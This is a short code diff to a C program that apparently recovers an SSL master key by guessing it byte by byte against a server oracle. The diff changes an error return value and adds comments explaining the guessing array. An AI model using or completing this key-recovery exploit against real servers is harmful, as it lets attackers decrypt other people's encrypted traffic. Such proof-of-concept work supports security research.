@@ -364,7 +364,7 @@ SSL* oracle_test_key(char *hostaddress,
 	if (!recv_server_hello(ssl))
 	{
 		printf("Cipher list is not supported\n");
-		return -1;
+		return NULL;
 	}
 
 	printf("Sending master key guess...\n");
@@ -445,8 +445,13 @@ int main(int argc, char **argv)
 									"\xae\xec\xba\x5f\xe2\x8c\x86\xd0\xe3\x8b\x8b\x87\x9a\x66\xa9\x3d";
 
 	unsigned char keysize = 24;
+
+	// Double the size, so we can shift the bytes to the left
+	// after each step, because we learn them from MSB to LSB
 	unsigned char guess_array[keysize*2];
-    memset(guess_array, 0, keysize*2); // Array full of zeroes, we guess the bytes one by one
+
+	// Array full of zeroes, we guess the bytes one by one
+    memset(guess_array, 0, keysize*2);
     unsigned char *master_key_guess = guess_array;
 
 	for (int current_byte = keysize - 1; current_byte >= 0; current_byte--)
